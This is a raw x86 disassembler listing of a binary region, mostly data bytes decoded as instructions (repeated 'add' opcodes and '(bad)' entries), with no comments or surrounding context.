11011dcc:	sbb    DWORD PTR [ecx],ebx
11011dce:	pop    es
11011dcf:	add    eax,0x3f3f3f3b
11011dd4:	aas    
11011dd5:	aas    
11011dd6:	aas    
11011dd7:	cmp    eax,DWORD PTR ds:0x31a1a07
11011ddd:	add    BYTE PTR [eax],al
11011ddf:	add    BYTE PTR [eax],al
11011de1:	add    BYTE PTR [eax],al
11011de3:	add    ebx,DWORD PTR [ecx]
11011de5:	sbb    DWORD PTR [ecx],ebx
11011de7:	pop    es
11011de8:	add    eax,0x3f3f3f3b
11011ded:	aas    
11011dee:	cmp    eax,DWORD PTR ds:0x1a1a1a07
11011df4:	add    eax,DWORD PTR [eax]
11011df6:	add    BYTE PTR [eax],al
11011df8:	add    BYTE PTR [eax],al
11011dfa:	add    BYTE PTR [ecx],al
11011dfc:	add    eax,DWORD PTR [ebx]
11011dfe:	add    eax,DWORD PTR [ebx]
11011e00:	add    al,BYTE PTR [esi]
11011e02:	cmp    edi,DWORD PTR [edi]
11011e04:	aas    
11011e05:	cmp    eax,DWORD PTR [edx+eax*1]
11011e08:	add    eax,DWORD PTR [ebx]
11011e0a:	add    eax,DWORD PTR [ebx]
11011e0c:	add    DWORD PTR [eax],eax
	...
11011e1a:	push   es
11011e1b:	cmp    edi,DWORD PTR [ebx]
11011e1d:	push   es
	...
11011e32:	add    BYTE PTR [esi],al
11011e34:	push   es
	...
11011e55:	add    BYTE PTR [eax],al
11011e57:	add    bh,bh
11011e59:	(bad)  
11011e5a:	inc    DWORD PTR [eax]
11011e5c:	jmp    edi
11011e5e:	inc    DWORD PTR [eax]
11011e60:	inc    ebx
11011e62:	inc    DWORD PTR [eax]
11011e64:	loopne 0x11011e66
11011e66:	pop    es
11011e67:	add    al,ah
11011e69:	add    BYTE PTR [edi],al
11011e6b:	add    al,ah
11011e6d:	add    BYTE PTR [edi],al
11011e6f:	add    al,ah
11011e71:	add    BYTE PTR [edi],al
11011e73:	add    al,ah
11011e75:	add    BYTE PTR [edi],al
11011e77:	add    al,ah
11011e79:	add    BYTE PTR [edi],al
11011e7b:	add    al,ah
11011e7d:	add    BYTE PTR [edi],al
11011e7f:	add    al,al
11011e81:	add    BYTE PTR [ebx],al
11011e83:	add    BYTE PTR [eax-0x7fffff00],al
11011e89:	add    BYTE PTR [ecx],al
11011e8b:	add    al,al
11011e8d:	add    BYTE PTR [ebx],al
11011e8f:	add    al,ah
11011e91:	add    BYTE PTR [edi],al
11011e93:	add    al,ah
11011e95:	add    BYTE PTR [edi],al
11011e97:	add    al,ah
11011e99:	add    BYTE PTR [edi],al
11011e9b:	add    al,ah
11011e9d:	add    BYTE PTR [edi],al
11011e9f:	add    al,ah
11011ea1:	add    BYTE PTR [edi],al
11011ea3:	add    al,ah
11011ea5:	add    BYTE PTR [edi],al
11011ea7:	add    al,ah
11011ea9:	add    BYTE PTR [edi],al
11011eab:	add    bh,bh
11011ead:	ret    
11011eae:	inc    DWORD PTR [eax]
11011eb0:	jmp    edi
11011eb2:	inc    DWORD PTR [eax]
11011eb4:	(bad)  
11011eb5:	(bad)  
11011eb6:	inc    DWORD PTR [eax]
11011eb8:	sub    BYTE PTR [eax],al
11011eba:	add    BYTE PTR [eax],al
11011ebc:	adc    BYTE PTR [eax],al
11011ebe:	add    BYTE PTR [eax],al
11011ec0:	and    BYTE PTR [eax],al
11011ec2:	add    BYTE PTR [eax],al
11011ec4:	add    DWORD PTR [eax],eax
11011ec6:	or     BYTE PTR [eax],al
	...
11011ee4:	xor    bl,BYTE PTR [esi]
11011ee6:	adc    eax,0x17233d00
11011eeb:	add    BYTE PTR [edx+0x45],bh
11011eee:	add    BYTE PTR cs:[ebx-0x63ffc3a7],bl
11011ef5:	pop    ecx
11011ef6:	cmp    al,0x0
11011ef8:	iret   
11011ef9:	bound  edi,QWORD PTR [edi]
11011efb:	add    ah,dl
11011efd:	popa   
11011efe:	cmp    al,BYTE PTR [eax]
11011f00:	(bad)  
11011f01:	imul   eax,DWORD PTR [eax+eax*1-0x24],0xdc00436c
11011f09:	ins    BYTE PTR es:[edi],dx
11011f0a:	inc    esp
11011f0b:	add    ch,bl
11011f0d:	jae    0x11011f5b
11011f0f:	add    ah,ah
11011f11:	js     0x11011f61
11011f13:	add    ah,ch
11011f15:	adc    BYTE PTR [esi+0x0],0xec
11011f19:	xchg   BYTE PTR [ebx+0x0],bl
11011f1c:	in     eax,dx
11011f1d:	mov    BYTE PTR [esi+0x0],bl
11011f20:	hlt    
11011f21:	mov    bl,BYTE PTR [ebx+0x0]
11011f24:	fisttp QWORD PTR [ebp-0x6e0cff8d]
11011f2a:	data16 add ch,dh
11011f2d:	xchg   ebx,eax
11011f2e:	data16 add ah,dh
11011f31:	cwde   
11011f32:	outs   dx,BYTE PTR ds:[esi]
11011f33:	add    dh,dh
11011f35:	popf   
11011f36:	jne    0x11011f38
11011f38:	mul    BYTE PTR [eax-0x5a59ff87]
11011f3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
11011f3f:	add    ch,ch
11011f41:	mov    ds:0xa8f70083,al
11011f46:	test   DWORD PTR [eax],eax
11011f48:	imul   DWORD PTR [ecx+ecx*4-0x6c4c0800]
11011f4f:	add    al,bh
11011f51:	mov    bh,0x9a
11011f53:	add    cl,bh
11011f55:	mov    ecx,0xcefb009c
11011f5a:	mov    edx,0xbdd0fa00
11011f5f:	add    bl,bh
11011f61:	rol    al,cl
11011f63:	add    bh,dh
11011f65:	in     eax,0xdf
11011f67:	add    ah,bh
11011f69:	in     eax,dx
11011f6a:	in     eax,0x0
11011f6c:	(bad)  
11011f6d:	cmc    
11011f6e:	icebp  
11011f6f:	add    bh,bh
11011f71:	(bad)  
11011f72:	inc    DWORD PTR [eax]
11011f74:	add    BYTE PTR [ebp-0x3cffff50],ah
11011f7a:	iret   
11011f7b:	add    BYTE PTR [eax],al
11011f7d:	loope  0x11011f6f
11011f7f:	add    BYTE PTR [ecx],dl
11011f81:	out    dx,eax
11011f82:	inc    DWORD PTR [eax]
11011f84:	xor    ecx,esi
11011f86:	inc    DWORD PTR [eax]
11011f88:	push   ecx
11011f89:	repz inc DWORD PTR [eax]
11011f8c:	jno    0x11011f83
11011f8e:	inc    DWORD PTR [eax]
11011f90:	xchg   ecx,eax
11011f91:	idiv   edi
11011f93:	add    BYTE PTR [ecx-0x2eff0007],dh
11011f99:	sti    
11011f9a:	inc    DWORD PTR [eax]
11011f9c:	(bad)  
11011f9d:	(bad)  
11011f9e:	inc    DWORD PTR [eax]
11011fa0:	add    BYTE PTR [eax],al
11011fa2:	add    BYTE PTR [eax],al
11011fa4:	add    BYTE PTR [edi],ch
11011fa6:	and    DWORD PTR [eax],eax
11011fa8:	add    BYTE PTR [eax+0x37],dl
11011fab:	add    BYTE PTR [eax],al
11011fad:	jo     0x11011ffb
11011faf:	add    BYTE PTR [eax],al
11011fb1:	nop
11011fb2:	arpl   WORD PTR [eax],ax
11011fb4:	add    BYTE PTR [eax-0x30ffff87],dh
11011fba:	pop    DWORD PTR [eax]
11011fbc:	add    al,dh
11011fbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
11011fbf:	add    BYTE PTR [ecx],dl
11011fc1:	push   DWORD PTR [eax+eax*1+0xbeff31]
11011fc8:	push   ecx
11011fc9:	dec    eax
11011fcb:	add    BYTE PTR [ecx-0x1],dh
11011fce:	rol    DWORD PTR [eax],cl
11011fd0:	xchg   ecx,eax
11011fd1:	(bad)  
11011fd2:	fadd   QWORD PTR [eax]
11011fd4:	mov    cl,0xff
11011fd6:	in     eax,0x0
11011fd8:	sar    edi,1
11011fda:	lock add bh,bh
11011fdd:	(bad)  
11011fde:	inc    DWORD PTR [eax]
11011fe0:	add    BYTE PTR [eax],al
11011fe2:	add    BYTE PTR [eax],al
11011fe4:	add    BYTE PTR [edi],ch
11011fe6:	push   cs
11011fe7:	add    BYTE PTR [eax],al
11011fe9:	push   eax
11011fea:	sbb    BYTE PTR [eax],al
11011fec:	add    BYTE PTR [eax+0x22],dh
11011fef:	add    BYTE PTR [eax],al
11011ff1:	nop
11011ff2:	sub    al,0x0
11011ff4:	add    BYTE PTR [eax-0x30ffffca],dh
11011ffa:	inc    eax
11011ffb:	add    BYTE PTR [eax],al
11011ffd:	lock dec edx
11011fff:	add    BYTE PTR [ecx],dl
11012001:	call   FWORD PTR [ebx+0x0]
11012004:	xor    edi,edi
11012006:	jno    0x11012008
11012008:	push   ecx
11012009:	inc    DWORD PTR [edi-0x62008f00]
1101200f:	add    BYTE PTR [ecx-0x4eff4d01],dl
11012015:	dec    ecx
11012017:	add    cl,dl
11012019:	(bad)  
1101201a:	fild   WORD PTR [eax]
1101201c:	(bad)  
1101201d:	(bad)  
1101201e:	inc    DWORD PTR [eax]
11012020:	add    BYTE PTR [eax],al
11012022:	add    BYTE PTR [eax],al
11012024:	add    ch,BYTE PTR [edi]
11012026:	add    BYTE PTR [eax],al
11012028:	add    al,0x50
1101202a:	add    BYTE PTR [eax],al
1101202c:	push   es
1101202d:	jo     0x1101202f
1101202f:	add    BYTE PTR [eax],cl
11012031:	nop
11012032:	add    BYTE PTR [eax],al
11012034:	or     dh,BYTE PTR [eax-0x30f50000]
1101203a:	add    BYTE PTR [eax],al
1101203c:	push   cs
1101203d:	lock add BYTE PTR [eax],al
11012040:	and    bh,bh
11012042:	adc    al,BYTE PTR [eax]
11012044:	cmp    eax,0x5b0031ff
11012049:	call   DWORD PTR [ecx+0x0]
1101204c:	jns    0x1101204d
1101204e:	jno    0x11012050
11012050:	cwde   
11012051:	call   DWORD PTR [ecx-0x4e004b00]
11012057:	add    ah,dl
11012059:	call   ecx
1101205b:	add    bh,bh
1101205d:	(bad)  
1101205e:	inc    DWORD PTR [eax]
11012060:	add    BYTE PTR [eax],al
11012062:	add    BYTE PTR [eax],al
11012064:	adc    al,0x2f
11012066:	add    BYTE PTR [eax],al
11012068:	and    dl,BYTE PTR [eax+0x0]
1101206b:	add    BYTE PTR [eax],dh
1101206d:	jo     0x1101206f
1101206f:	add    BYTE PTR ds:0x4c000090,bh
11012075:	mov    al,0x0
11012077:	add    BYTE PTR [ecx-0x31],bl
1101207a:	add    BYTE PTR [eax],al
1101207c:	lock add BYTE PTR [bx+si],al
11012080:	js     0x11012081
11012082:	adc    DWORD PTR [eax],eax
11012084:	mov    bh,bh
11012086:	xor    DWORD PTR [eax],eax
11012088:	pushf  
11012089:	call   DWORD PTR [ecx+0x0]
1101208c:	scas   al,BYTE PTR es:[edi]
1101208d:	push   DWORD PTR [ecx+0x0]
11012090:	sar    bh,0x91
11012093:	add    dl,dl
11012095:	push   DWORD PTR [ecx-0x2e001c00]
1101209b:	add    bh,bh
1101209d:	(bad)  
1101209e:	inc    DWORD PTR [eax]
110120a0:	add    BYTE PTR [eax],al
110120a2:	add    BYTE PTR [eax],al
110120a4:	es das 
110120a6:	add    BYTE PTR [eax],al
110120a8:	inc    eax
110120a9:	push   eax
110120aa:	add    BYTE PTR [eax],al
110120ac:	pop    edx
110120ad:	jo     0x110120af
110120af:	add    BYTE PTR [eax+edx*4+0x0],dh
110120b3:	add    BYTE PTR [esi-0x56ffff50],cl
110120b9:	iret   
110120ba:	add    BYTE PTR [eax],al
110120bc:	ret    0xf0
110120bf:	add    cl,dl
110120c1:	call   DWORD PTR [ecx]
110120c3:	add    al,bl
110120c5:	push   DWORD PTR [ecx]
110120c7:	add    dh,bl
110120c9:	call   DWORD PTR [ecx+0x0]
110120cc:	jecxz  0x110120cd
110120ce:	jno    0x110120d0
110120d0:	jmp    0x1b2d4
110120d5:	push   DWORD PTR [ecx-0x2e000a00]
110120db:	add    bh,bh
110120dd:	(bad)  
110120de:	inc    DWORD PTR [eax]
110120e0:	add    BYTE PTR [eax],al
110120e2:	add    BYTE PTR [eax],al
110120e4:	das    
110120e5:	add    BYTE PTR es:[eax],al
110120e8:	push   eax
110120e9:	inc    ecx
110120ea:	add    BYTE PTR [eax],al
110120ec:	jo     0x11012149
110120ee:	add    BYTE PTR [eax],al
110120f0:	nop
110120f1:	je     0x110120f3
110120f3:	add    BYTE PTR [eax-0x30ffff72],dh
110120f9:	test   eax,0xc3f00000
110120fe:	add    BYTE PTR [eax],al
11012100:	call   edx
11012102:	adc    DWORD PTR [eax],eax
11012104:	(bad)  
11012105:	fdiv   DWORD PTR [ecx]
11012107:	add    bh,bh
11012109:	fst    QWORD PTR [ecx+0x0]
1101210c:	jmp    esp
1101210e:	jno    0x11012110
11012110:	(bad)  
11012111:	jmp    0xb1:0xf0ff0091
11012118:	push   esi
1101211a:	rol    DWORD PTR [eax],1
1101211c:	(bad)  
1101211d:	(bad)  
1101211e:	inc    DWORD PTR [eax]
11012120:	add    BYTE PTR [eax],al
11012122:	add    BYTE PTR [eax],al
11012124:	das    
11012125:	adc    al,0x0
11012127:	add    BYTE PTR [eax+0x22],dl
1101212a:	add    BYTE PTR [eax],al
1101212c:	jo     0x1101215e
1101212e:	add    BYTE PTR [eax],al
11012130:	nop
11012131:	add    BYTE PTR ds:[eax],al
11012134:	mov    al,0x4d
11012136:	add    BYTE PTR [eax],al
11012138:	iret   
11012139:	pop    ebx
1101213a:	add    BYTE PTR [eax],al
1101213c:	lock imul eax,DWORD PTR [eax],0x1179ff00
11012143:	add    bh,bh
11012145:	mov    dh,BYTE PTR [ecx]
11012147:	add    bh,bh
11012149:	popf   
1101214a:	push   ecx
1101214b:	add    bh,bh
1101214d:	scas   eax,DWORD PTR es:[edi]
1101214e:	jno    0x11012150
11012150:	inc    ecx
11012152:	xchg   ecx,eax
11012153:	add    bh,bh
11012155:	shl    BYTE PTR [ecx-0x2e1a0100],cl
1101215b:	add    bh,bh
1101215d:	(bad)  
1101215e:	inc    DWORD PTR [eax]
11012160:	add    BYTE PTR [eax],al
11012162:	add    BYTE PTR [eax],al
11012164:	das    
11012165:	add    eax,DWORD PTR [eax]
11012167:	add    BYTE PTR [eax+0x4],dl
1101216a:	add    BYTE PTR [eax],al
1101216c:	jo     0x11012174
1101216e:	add    BYTE PTR [eax],al
11012170:	nop
11012171:	or     DWORD PTR [eax],eax
11012173:	add    BYTE PTR [eax-0x30fffff6],dh
11012179:	or     al,0x0
1101217b:	add    al,dh
1101217d:	push   cs
1101217e:	add    BYTE PTR [eax],al
11012180:	jmp    DWORD PTR [eax]
11012182:	adc    al,BYTE PTR [eax]
11012184:	(bad)  
11012185:	xor    DWORD PTR ds:[eax],eax
11012188:	call   FWORD PTR [ecx+edx*2+0x0]
1101218c:	(bad)  
1101218d:	jp     0x11012200
1101218f:	add    bh,bh
11012191:	xchg   edi,eax
11012192:	xchg   ecx,eax
11012193:	add    bh,bh
11012195:	mov    dh,0xb1
11012197:	add    bh,bh
11012199:	aam    0xd1
1101219b:	add    bh,bh
1101219d:	(bad)  
1101219e:	inc    DWORD PTR [eax]
110121a0:	add    BYTE PTR [eax],al
110121a2:	add    BYTE PTR [eax],al
110121a4:	das    
110121a5:	add    BYTE PTR [esi],cl
110121a7:	add    BYTE PTR [eax+0x0],dl
110121aa:	pop    ss
110121ab:	add    BYTE PTR [eax+0x0],dh
110121ae:	and    DWORD PTR [eax],eax
110121b0:	nop
110121b1:	add    BYTE PTR [ebx],ch
110121b3:	add    BYTE PTR [eax-0x30ffca00],dh
110121b9:	add    BYTE PTR [eax+0x0],al
110121bc:	lock add BYTE PTR [ecx+0x0],cl
110121c0:	call   DWORD PTR [ecx]
110121c2:	pop    edx
110121c3:	add    bh,bh
110121c5:	xor    DWORD PTR [eax+0x0],esi
110121c8:	call   DWORD PTR [ecx-0x7a]
110121cb:	add    bh,bh
110121cd:	jno    0x1101216b
110121cf:	add    bh,bh
110121d1:	xchg   ecx,eax
110121d2:	mov    dl,0x0
110121d4:	push   DWORD PTR [ecx-0x2e00ff38]
110121da:	fild   WORD PTR [eax]
110121dc:	(bad)  
110121dd:	(bad)  
110121de:	inc    DWORD PTR [eax]
110121e0:	add    BYTE PTR [eax],al
110121e2:	add    BYTE PTR [eax],al
110121e4:	das    
110121e5:	add    BYTE PTR [eax],ah
110121e7:	add    BYTE PTR [eax+0x0],dl
110121ea:	add    BYTE PTR ss:[eax+0x0],dh
110121ee:	dec    esp
110121ef:	add    BYTE PTR [eax-0x4fff9e00],dl
110121f5:	add    BYTE PTR [eax+0x0],bh
110121f8:	iret   
110121f9:	add    BYTE PTR [esi-0x5bff1000],cl
110121ff:	add    bh,bh
11012201:	adc    DWORD PTR [ebx-0x41ce0100],esi
11012207:	add    bh,bh
11012209:	push   ecx
1101220a:	mov    DWORD PTR [eax],0xd171ff
11012210:	call   DWORD PTR [ecx-0x4e00ff24]
11012216:	in     eax,0x0
11012218:	call   ecx
1101221a:	lock add bh,bh
1101221d:	(bad)  
1101221e:	inc    DWORD PTR [eax]
11012220:	add    BYTE PTR [eax],al
11012222:	add    BYTE PTR [eax],al
11012224:	sub    al,0x0
11012226:	das    
11012227:	add    BYTE PTR [ebx+0x0],cl
1101222a:	push   eax
1101222b:	add    BYTE PTR [ecx+0x0],ch
1101222e:	jo     0x11012230
11012230:	xchg   DWORD PTR [eax],eax
11012232:	nop
11012233:	add    BYTE PTR [ebp-0x3bff5000],ah
11012239:	add    bh,cl
1101223b:	add    cl,ah
1101223d:	add    al,dh
1101223f:	add    al,dh
11012241:	adc    edi,edi
11012243:	add    dl,dh
11012245:	xor    edi,edi
11012247:	add    ah,dh
11012249:	push   ecx
1101224a:	inc    DWORD PTR [eax]
1101224c:	div    BYTE PTR [ecx-0x1]
1101224f:	add    bh,dh
11012251:	xchg   ecx,eax
11012252:	inc    DWORD PTR [eax]
11012254:	stc    
11012255:	mov    cl,0xff
11012257:	add    bl,bh
11012259:	sar    edi,1
1101225b:	add    bh,bh
1101225d:	(bad)  
1101225e:	inc    DWORD PTR [eax]
11012260:	add    BYTE PTR [eax],al
11012262:	add    BYTE PTR [eax],al
11012264:	sbb    eax,DWORD PTR [eax]
11012266:	das    
11012267:	add    BYTE PTR ds:0x3f005000,ch
1101226d:	add    BYTE PTR [eax+0x0],dh
11012270:	push   edx
11012271:	add    BYTE PTR [eax-0x4fff9d00],dl
11012277:	add    BYTE PTR [esi+0x0],dh
1101227a:	iret   
1101227b:	add    BYTE PTR [eax-0x66ff1000],cl
11012281:	adc    edi,edi
11012283:	add    BYTE PTR [esi-0x4bff00cf],ah
11012289:	push   ecx
1101228a:	inc    DWORD PTR [eax]
1101228c:	ret    0xff71
1101228f:	add    bh,cl
11012291:	xchg   ecx,eax
11012292:	inc    DWORD PTR [eax]
11012294:	fdiv   QWORD PTR [ecx-0x2e14ff01]
1101229a:	inc    DWORD PTR [eax]
1101229c:	(bad)  
1101229d:	(bad)  
1101229e:	inc    DWORD PTR [eax]
110122a0:	add    BYTE PTR [eax],al
110122a2:	add    BYTE PTR [eax],al
110122a4:	or     BYTE PTR [eax],al
110122a6:	das    
110122a7:	add    BYTE PTR [esi],cl
110122a9:	add    BYTE PTR [eax+0x0],dl
110122ac:	adc    eax,0x1b007000
110122b1:	add    BYTE PTR [eax-0x4fffdf00],dl
110122b7:	add    BYTE PTR [esi],ah
110122b9:	add    bh,cl
110122bb:	add    BYTE PTR [eax+eax*1],ch
110122be:	lock add BYTE PTR [esi],bh
110122c1:	adc    edi,edi
110122c3:	add    BYTE PTR [eax+0x31],bl
110122c6:	inc    DWORD PTR [eax]
110122c8:	jno    0x1101231b
110122ca:	inc    DWORD PTR [eax]
110122cc:	mov    WORD PTR [ecx-0x1],?
110122cf:	add    BYTE PTR [esi-0x40ff006f],ah
110122d5:	mov    cl,0xff
110122d7:	add    dl,bl
110122d9:	sar    edi,1
110122db:	add    bh,bh
110122dd:	(bad)  
110122de:	inc    DWORD PTR [eax]
110122e0:	add    BYTE PTR [eax],al
110122e2:	add    BYTE PTR [eax],al
110122e4:	add    BYTE PTR [eax],al
110122e6:	add    BYTE PTR [edi],dl
110122e8:	pop    ss
	...
110122f5:	add    BYTE PTR [edi],dl
110122f7:	pop    ss
110122f8:	pop    ss
110122f9:	pop    ss
	...
11012302:	add    al,BYTE PTR [ebx]
11012304:	add    eax,DWORD PTR [ecx]
11012306:	pop    ss
11012307:	and    al,0x24
11012309:	pop    ss
1101230a:	add    DWORD PTR [ebx],eax
1101230c:	add    eax,DWORD PTR [edx]
1101230e:	add    BYTE PTR [eax],al
11012310:	add    BYTE PTR [eax],al
11012312:	add    edx,DWORD PTR [eax]
11012314:	add    eax,0x24242417
11012319:	and    al,0x17
1101231b:	add    eax,0x310
11012320:	add    BYTE PTR [eax],al
11012322:	add    eax,DWORD PTR ds:0xb182217
11012328:	or     BYTE PTR [ecx],dl
1101232a:	and    DWORD PTR [edi],edx
1101232c:	add    eax,0x3
11012331:	add    BYTE PTR [ecx],al
11012333:	pop    ss
11012334:	and    dl,BYTE PTR [ebx]
11012336:	or     eax,0x607090c
1101233b:	and    DWORD PTR [edi],edx
1101233d:	add    DWORD PTR [eax],eax
1101233f:	add    BYTE PTR [eax],al
11012341:	pop    ss
11012342:	pop    ss
11012343:	and    al,0x1b
11012345:	adc    edx,DWORD PTR [edx]
11012347:	(bad)  
11012349:	or     al,BYTE PTR [edi]
1101234b:	adc    DWORD PTR [edi+edx*1],esp
1101234e:	pop    ss
1101234f:	add    BYTE PTR [edi],dl
11012351:	pop    ss
11012352:	and    al,0x24
11012354:	adc    eax,0xf141616
11012359:	or     al,0xa
1101235b:	or     BYTE PTR [esp],ah
1101235e:	pop    ss
1101235f:	pop    ss
11012360:	pop    ss
11012361:	pop    ss
11012362:	and    al,0x24
11012364:	sbb    bl,BYTE PTR ds:0xe14191c
1101236a:	or     al,0xb
1101236c:	and    al,0x24
1101236e:	pop    ss
1101236f:	pop    ss
11012370:	add    BYTE PTR [edi],dl
11012372:	pop    ss
11012373:	and    al,0x1e
11012375:	and    BYTE PTR [edi],bl
11012377:	sbb    eax,0x180d1216
1101237c:	and    al,0x17
1101237e:	pop    ss
1101237f:	add    BYTE PTR [eax],al
11012381:	add    BYTE PTR [ecx],al
11012383:	pop    ss
11012384:	and    esp,DWORD PTR [eax]
11012386:	and    BYTE PTR ds:0x22131316,bl
1101238c:	pop    ss
1101238d:	add    DWORD PTR [eax],eax
1101238f:	add    BYTE PTR [eax],al
11012391:	add    BYTE PTR [ebx],al
11012393:	add    al,0x17
11012395:	and    ebx,DWORD PTR [esi]
11012397:	sbb    dl,BYTE PTR ds:0x517221b
1101239d:	add    eax,DWORD PTR [eax]
1101239f:	add    BYTE PTR [eax],al
110123a1:	add    BYTE PTR [ebx],al
110123a3:	adc    BYTE PTR [edi+edx*1],al
110123a6:	and    al,0x24
110123a8:	and    al,0x24
110123aa:	pop    ss
110123ab:	add    eax,0x310
110123b0:	add    BYTE PTR [eax],al
110123b2:	add    al,BYTE PTR [ebx]
110123b4:	add    eax,DWORD PTR [ecx]
110123b6:	pop    ss
110123b7:	and    al,0x24
110123b9:	pop    ss
110123ba:	add    DWORD PTR [ebx],eax
110123bc:	add    eax,DWORD PTR [edx]
	...
110123c6:	pop    ss
110123c7:	pop    ss
110123c8:	pop    ss
110123c9:	pop    ss
	...
110123d6:	add    BYTE PTR [edi],dl
110123d8:	pop    ss
110123d9:	add    BYTE PTR [eax],al
110123db:	add    BYTE PTR [eax],al
110123dd:	add    BYTE PTR [eax],al
110123df:	add    dh,bh
110123e1:	jg     0x110123e3
110123e3:	add    ah,bh
110123e5:	aas    
110123e6:	add    BYTE PTR [eax],al
110123e8:	rol    BYTE PTR [ebx],0x0
110123eb:	add    al,al
110123ed:	add    eax,DWORD PTR [eax]
110123ef:	add    al,al
110123f1:	add    eax,DWORD PTR [eax]
110123f3:	add    al,al
110123f5:	add    eax,DWORD PTR [eax]
110123f7:	add    BYTE PTR [eax+0x1],al
110123fd:	add    BYTE PTR [eax],al
110123ff:	add    BYTE PTR [eax],al
11012401:	add    BYTE PTR [eax],al
11012403:	add    BYTE PTR [eax-0x3fffffff],al
11012409:	add    eax,DWORD PTR [eax]
1101240b:	add    al,al
1101240d:	add    eax,DWORD PTR [eax]
1101240f:	add    al,al
11012411:	add    eax,DWORD PTR [eax]
11012413:	add    al,al
11012415:	add    eax,DWORD PTR [eax]
11012417:	add    ah,bh
11012419:	aas    
1101241a:	add    BYTE PTR [eax],al
1101241c:	(bad)  
1101241d:	jg     0x1101241f
1101241f:	add    BYTE PTR [eax],ch
11012421:	add    BYTE PTR [eax],al
11012423:	add    BYTE PTR [eax],dh
11012425:	add    BYTE PTR [eax],al
11012427:	add    BYTE PTR [eax+0x0],ah
1101242a:	add    BYTE PTR [eax],al
1101242c:	add    DWORD PTR [eax],eax
1101242e:	and    BYTE PTR [eax],al
	...
11012488:	add    BYTE PTR [eax],al
1101248a:	add    BYTE PTR [ecx],al
1101248c:	add    BYTE PTR [eax],al
1101248e:	add    BYTE PTR ds:0x10000000,al
11012494:	add    BYTE PTR [eax],al
11012496:	add    BYTE PTR ds:0x46000000,ah
1101249c:	add    BYTE PTR [eax],al
1101249e:	add    BYTE PTR [ecx+0x0],dh
110124a1:	add    BYTE PTR [eax],al
110124a3:	call   0x0:0xbe000000
110124aa:	add    BYTE PTR [esi-0x66000000],bh
110124b0:	add    BYTE PTR [eax],al
110124b2:	add    BYTE PTR [eax+0x0],dh
110124b5:	add    BYTE PTR [eax],al
110124b7:	inc    esi
110124b8:	add    BYTE PTR [eax],al
110124ba:	add    BYTE PTR ds:0x10000000,ah
110124c0:	add    BYTE PTR [eax],al
110124c2:	add    BYTE PTR ds:0x1000000,al
	...
11012520:	add    BYTE PTR [eax],al
11012522:	add    BYTE PTR [ecx],al
11012524:	add    BYTE PTR [eax],al
11012526:	add    BYTE PTR [ebx],al
11012528:	add    BYTE PTR [eax],al
1101252a:	add    BYTE PTR [eax+eax*1],al
1101252d:	add    BYTE PTR [eax],al
1101252f:	add    eax,0x5000000
11012534:	add    BYTE PTR [eax],al
11012536:	add    BYTE PTR [esi],al
11012538:	add    BYTE PTR [eax],al
1101253a:	add    BYTE PTR [esi],al
1101253c:	add    BYTE PTR [eax],al
1101253e:	add    BYTE PTR [esi],al
11012540:	add    BYTE PTR [eax],al
11012542:	add    BYTE PTR [esi],al
11012544:	add    BYTE PTR [eax],al
11012546:	add    BYTE PTR [esi],al
11012548:	add    BYTE PTR [eax],al
1101254a:	add    BYTE PTR [ebx],cl
1101254c:	add    BYTE PTR [eax],al
1101254e:	add    BYTE PTR ds:0x2a000000,dl
11012554:	add    BYTE PTR [eax],al
11012556:	add    BYTE PTR [edx+0x0],cl
11012559:	add    BYTE PTR [eax],al
1101255b:	je     0x1101255d
1101255d:	add    BYTE PTR [eax],al
1101255f:	mov    ds:0xcd000000,al
11012564:	add    BYTE PTR [eax],al
11012566:	add    dl,bh
11012568:	add    BYTE PTR [eax],al
1101256a:	add    dl,bh
1101256c:	add    BYTE PTR [eax],al
1101256e:	add    ch,cl
11012570:	add    BYTE PTR [eax],al
11012572:	add    BYTE PTR [edx+0x74000000],ah
11012578:	add    BYTE PTR [eax],al
1101257a:	add    BYTE PTR [edx+0x0],cl
1101257d:	add    BYTE PTR [eax],al
1101257f:	sub    DWORD PTR [eax],eax
11012581:	add    BYTE PTR [eax],al
11012583:	adc    eax,0xa000000
11012588:	add    BYTE PTR [eax],al
1101258a:	add    BYTE PTR [esi],al
1101258c:	add    BYTE PTR [eax],al
1101258e:	add    BYTE PTR [esi],al
11012590:	add    BYTE PTR [eax],al
11012592:	add    BYTE PTR [esi],al
11012594:	add    BYTE PTR [eax],al
11012596:	add    BYTE PTR [esi],al
11012598:	add    BYTE PTR [eax],al
1101259a:	add    BYTE PTR [esi],al
1101259c:	add    BYTE PTR [eax],al
1101259e:	add    BYTE PTR [esi],al
110125a0:	add    BYTE PTR [eax],al
110125a2:	add    BYTE PTR [esi],al
110125a4:	add    BYTE PTR [eax],al
110125a6:	add    BYTE PTR [esi],al
110125a8:	add    BYTE PTR [eax],al
110125aa:	add    BYTE PTR ds:0x5000000,al
110125b0:	add    BYTE PTR [eax],al
110125b2:	add    BYTE PTR [eax+eax*1],al
110125b5:	add    BYTE PTR [eax],al
110125b7:	add    eax,DWORD PTR [eax]
110125b9:	add    BYTE PTR [eax],al
110125bb:	add    DWORD PTR [eax],eax
	...
110125dd:	add    BYTE PTR [eax],al
110125df:	add    al,BYTE PTR [eax]
110125e1:	add    BYTE PTR [eax],al
110125e3:	push   es
110125e4:	add    BYTE PTR [eax],al
110125e6:	add    BYTE PTR [eax+eax*1],cl
110125e9:	add    BYTE PTR [eax],al
110125eb:	adc    al,BYTE PTR [eax]
110125ed:	add    BYTE PTR [eax],al
110125ef:	push   ss
110125f0:	add    BYTE PTR [eax],al
110125f2:	add    BYTE PTR [edi],dl
110125f4:	add    BYTE PTR [eax],al
110125f6:	add    BYTE PTR [eax],bl
110125f8:	add    BYTE PTR [eax],al
110125fa:	add    BYTE PTR [eax],bl
110125fc:	add    BYTE PTR [eax],al
110125fe:	add    BYTE PTR [eax],bl
11012600:	add    BYTE PTR [eax],al
11012602:	add    BYTE PTR [ecx],bl
11012604:	add    BYTE PTR [eax],al
11012606:	add    BYTE PTR [eax+eax*1],bl
11012609:	add    BYTE PTR [eax],al
1101260b:	add    BYTE PTR es:[eax],al
1101260e:	add    BYTE PTR [eax],bh
11012610:	add    BYTE PTR [eax],al
11012612:	add    BYTE PTR [edi+0x0],dl
11012615:	add    BYTE PTR [eax],al
11012617:	jle    0x11012619
11012619:	add    BYTE PTR [eax],al
1101261b:	test   al,0x0
1101261d:	add    BYTE PTR [eax],al
1101261f:	rol    BYTE PTR [eax],cl
11012621:	add    BYTE PTR [eax],al
11012623:	sti    
11012624:	sbb    eax,0x1cff1d1d
11012629:	sbb    al,0x1c
